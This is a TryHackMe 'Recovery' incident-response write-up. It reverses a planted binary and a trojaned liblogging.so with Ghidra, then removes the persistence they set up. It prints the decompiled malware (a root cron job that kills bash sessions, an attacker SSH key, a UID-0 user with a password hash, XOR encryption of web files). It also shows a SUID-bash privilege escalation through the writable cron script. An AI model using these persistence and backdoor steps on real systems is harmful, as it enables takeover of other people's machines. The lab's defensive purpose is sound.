# Try Hack Me - Recovery

**Categories:** Malware, reversing, linux, analysis  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.5.51`) in place of the target machine's IP address.

This is not a standard boot2root CTF machine. We are given credentials to a compromised server for basic incident response activities. Flags are revealed as attacker's activities are discovered and remediated. 

## Prelims 1 - ssh -t

We are provided with SSH credentials for the user alex, but following connection we are met with an infinitely scrolling message :

```console
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
```

Presumably then the attacker has made some change to the alex user's default shell or ssh config to display this message. We can avoid triggering the message by using the `-t` flag in our SSH command, executing a command before the login shell session begins :  

```console
┌──(kali㉿kali)-[~/Documents/tthm/recovery]
└─$ ssh alex@$IP -t '/bin/sh'
alex@10.10.5.51's password: 
$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex)
```

## Prelims 2 - Ghidra, reversing

Once connected we find the malicious `fixutil` binary that was executed by alex in their home directory. We can pull it down with scp (`scp alex@$IP:~/fixutl ./`) and decompile it using [Ghidra](https://ghidra-sre.org/). Decompilation reveals the following main function : 

```c
{
  FILE *pFVar1;
  
  pFVar1 = fopen("/home/alex/.bashrc","a");
  fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,pFVar1);
  fclose(pFVar1);
  system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
  pFVar1 = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
  fwrite(&bin2c_liblogging_so,0x5a88,1,pFVar1);
  fclose(pFVar1);
  system("echo pwned | /bin/admin > /dev/null");
  return 0;
}
```

The function performs the following actions : 

1. Calls fopen and fwrite to append a while loop to `/home/alex/.bashrc` (this is the source of our infinitely scrolling message - we'll come back to this later)
2. Calls system (with a call to cp), fopen and fwrite to replace the `/lib/x86_64-linux-gnu/liblogging.so` file with the contents of the `&bin2c_liblogging_so` array.
3. Calls system to echo "pwned" into an unknown binary `/bin/admin`, redirecting the output to `/dev/null`

Obviously something is going on the with `liblogging.so` file, but it looks like the call to `/bin/admin` is our entry point for malicious code execution. So we repeat the same process, scping down `/bin/admin` and decompiling with Ghidra to reveal another main function : 

```c
{
  int iVar1;
  size_t local_20;
  char *local_18;
  char *local_10;
  
  setresuid(0,0,0);
  setresgid(0,0,0);
  puts("Welcome to the Recoverysoft Administration Tool! Please input your password:");
  local_10 = "youdontneedtofindthepassword\n";
  local_18 = (char *)0x0;
  local_20 = 0x100;
  getline(&local_18,&local_20,stdin);
  iVar1 = strcmp(local_18,local_10);
  if (iVar1 == 0) {
    puts("This section is currently under development, sorry.");
  }
  else {
    puts("Incorrect password! This will be logged!");
    LogIncorrectAttempt(local_18);
  }
  return 0;
```

Presumably this binary is attempting to imitate a legitimate custom admin tool used on the system as a persistence method - following clean up, any attempt to use this tool will recompromise the system. Most interesting for us is the call to LogIncorrectAttempt, which doesn't appear to be defined within the `/bin/admin` binary. Maybe it's in the `liblogging.so` file we found before? So we do the same thing again, scping down `/lib/x86_64-linux-gnu/liblogging.so` and decompiling with Ghidra, targeting the LogIncorrectAttempt function. The result is a bit long, so I've included it as a [seperate file](./LogIncorrectAttempt.c) - this will provide the basis for our recovery activities, and I'll quote the relevant parts of the function as we go. 


## Flag 0 : .bashrc

The first flag requires us to fix the infinite scrolling message encountered when connecting as alex. Returning to the main function of the `fixutils` binary, we see the following two lines :

```c
...snip...
pFVar1 = fopen("/home/alex/.bashrc","a");
fwrite("\n\nwhile :; do echo \"YOU DIDN\'T SAY THE MAGIC WORD!\"; done &\n",1,0x3c,pFVar1);
...snip...
```

The first line opens the `/home/alex/.bashrc` file. `.bashrc` files are executed by Bash to initialize interactive shell sessions (i.e. they are not executed when bash is just used to run a script), allowing for session customisation, the definition of aliases, etc. The second line then appends an infinite loop to the file (note the `while :` syntax) that echoes "YOU DIDN'T SAY THE MAGIC WORD". This is why we saw the infinite message when connecting as alex - their login shell is `/bin/bash`, so `/home/alex/.bashrc` is run on login to initialize their shell session, and the infinite loop added by the attackers is executed.

Remove the malicious line from `/home/alex/.bashrc`. Refresh the flag page for flag 0.

## Flag 1 : cronjob, process killer

Having removed the infinite loop, we can reconnect as alex with a bash shell. But after a minute or so, the system kicks us out :

```console
┌──(kali㉿kali)-[~/Documents/tthm/recovery]
└─$ ssh alex@$IP
alex@10.10.5.51's password: 

Last login: Tue Oct 19 04:26:46 2021 from ATTACK-IP
alex@recoveryserver:~$ logout
Connection to 10.10.5.51 closed.
```

Returning to the LogIncorrectAttempt function of `/lib/x86_64-linux-gnu/liblogging.so` we find the following lines to kill Bash processes : 

```c
...snip...
pFVar2 = fopen("/opt/brilliant_script.sh","w");
fwrite("#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill $i; done;\n",1,0x5f,pFVar2);
fclose(pFVar2);
pFVar2 = fopen("/etc/cron.d/evil","w");
fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,pFVar2);
fclose(pFVar2)
...snip...
```

The first 3 lines create a script `/opt/brilliant_script.sh` that gets a list of all active bash sessions (`ps aux | grep bash`), extracts their process IDs (`awk \'{print $2}\'`) and kills them one by one (`kill $i`). The next three lines create a cronjob `evil` in `/etc/cron.d` that runs this script as root every minute, which explains why we keep on being booted out.

You might also have noticed that this gives us a privesc vector, and we'll need root permissions for some of the later flags. Replacing the attacker's script at `/opt/brilliant_script.sh` with a command that creates an SUID Bash binary (`cp /bin/bash /tmp/bdoor && chmod u+s /tmp/bdoor`) provides us with access to a root shell : 

```console
alex@recoveryserver:~$ /tmp/bdoor -p
bdoor-5.0# whoami
root
```

These changes to `/opt/brilliant_script.sh` are enough for flag 1, but in real life, we'd probably also want to remove the `/etc/cron.d/evil` file. Refresh the flag page for flag 1.

## Flag 2 : remove / restore files 

We've already seen that the `fixutils` file copies the `/lib/x86_64-linux-gnu/liblogging.so` file to `/tmp/logging.so`, and replaces the original :

```c
...snip...
system("/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so");
pFVar1 = fopen("/lib/x86_64-linux-gnu/liblogging.so","wb");
fwrite(&bin2c_liblogging_so,0x5a88,1,pFVar1);
...snip...
```

This replacement provides the "LogIncorrectAttempt" function called by `/bin/admin`. This function moves and renames the original `liblogging.so` again, from `/tmp` back to `/lib` :

```c
...snip...
system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
...snip...
```

Replace the malicious file with the original (`mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so`) - again in real life we'd probably also want to remove the `/bin/admin` binary at this stage. Refresh the flag page for flag 2.

## Flag 3 : authorized_keys

The LogIncorrectAttempt function called by `/bin/admin` includes the following lines, overwriting `/root/.ssh/authorized_keys` with an attackers public key : 

```c
...snip...
pFVar2 = fopen("/root/.ssh/authorized_keys","w");
fprintf(pFVar2,"%s\n",
  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"
);
fclose(pFVar2);
...snip...
```

Remove this key from `/root/.ssh/authorized_keys` (you can add your own if you want SSH access to the machine). Refresh the flag page for flag 3.

## Flag 4 : remove privileged user

The same function also includes the following lines, creating a new user "security" with root permissions (note the UID and GID of 0) : 

```c
system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
system(
      "/bin/echo \'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
      );
```

Remove this user with `userdel -f security`. Refresh the flag page for flag 4.

# Flag 5 : reversing, decryption

After running the `fixutils` binary, Alex noticed that the pages hosted by their application had been defaced or encrypted :

```console
┌──(kali㉿kali)-[~/Documents/tthm/recovery]
└─curl $IP --output -
}E7&3<'LRKX[}fLFKQ       McPpEWfLFKQW"50
5X\$    xflKMLLaDSIL#*  XaMLLaDSIPpEWf  LKDSIPpEWfLFKMLLa7|LVPgLLaDSIPpEWfLgLLaDSIPpEWfLLKfLaDSIPpEWfLFKMLL'
...snip...
```

During analysis of the LogIncorrectAttempt function included in the malicious `liblogging.so` replacement, we found a call to an additional function XOREncryptWebFiles :

```c
...snip...
system(
      "/bin/echo \'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
      );
XOREncryptWebFiles();
pFVar2 = fopen("/opt/brilliant_script.sh","w");
...snip...
```

We can return to the `liblogging.so` binary in Ghidra, this time targeting the XOREncryptWebFiles function ([included in a separate file](./XOREncryptWebFiles.c)). The code is obfuscated with a fair amount of nonsense and filler code, but the most interesting section is the following, where each file location returned by the GetWebFiles function is passed to an XORFile function : 

```c
  iVar1 = GetWebFiles(webfiles,8);
  for (i = 0; i < iVar1; i = i + 1) {
    XORFile(webfiles[i],str);
    free(webfiles[i]);
  }
```

Ghidra tells us that the GetWebFiles function uses a hard-coded variable "web_location" that points to `/usr/local/apache2/htdocs`, and sure enough this is where we find the encrypted files on the server : 

```console
bdoor-5.0# ls -la /usr/local/apache2/htdocs
total 24
drwxr-xr-x 1 root     root     4096 Jun 17  2020 .
drwxr-xr-x 1 www-data www-data 4096 May 15  2020 ..
-rw-rw-r-- 1 root     root      997 Jun 17  2020 index.html
-rw-rw-r-- 1 root     root      109 Jun 17  2020 reallyimportant.txt
-rw-rw-r-- 1 root     root       85 Jun 17  2020 todo.html
```

The XORFile function takes two parameters - the file location and the XOR key. We can see in the above call that the XOR key is contained in the variable "str", and that this variable is written to a back-up file `/opt/.fixutil/backup.txt`:

```c
...snip...
__stream = fopen("/opt/.fixutil/backup.txt","a");
fprintf(__stream,"%s\n",str);
fclose(__stream);
...snip...
```

Checking back on the server, we find a possible key in the same location. So with the encrypted files and the key, we can attempt to decrypt and restore the files  (we'll assume that the XOR implementation in XORFile function is fairly standard - we can always return to Ghidra to decompile the function if our decyption doesn't work out). To perform the decyption I wrote the following python script that takes the local file path as a command line argument and XORs the file against the discovered key (you'll have to download the encrypted files yourself) :

```python
#!/usr/bin/env python3

import sys

KEY = b'' # Replace with key from /opt/.fixutil/backup.txt
FILE_PATH = sys.argv[1]

def generate_long_key(key: bytes, target_length: int) -> bytes:
    while len(key) < target_length:
        key += key
    return key

with (open(FILE_PATH, 'rb')) as f:
    c = f.read()
    k = generate_long_key(KEY, len(c))
    p = bytes(a ^ b for a, b in zip(c, k)).decode()

with (open(FILE_PATH, 'w')) as f:
    f.write(p)
```

Download the encrypted files (use curl) and run the decryption script on each of them. Replace the encrypted files on the server with the decrypted versions (use scp). Refresh the flag page for flag 5.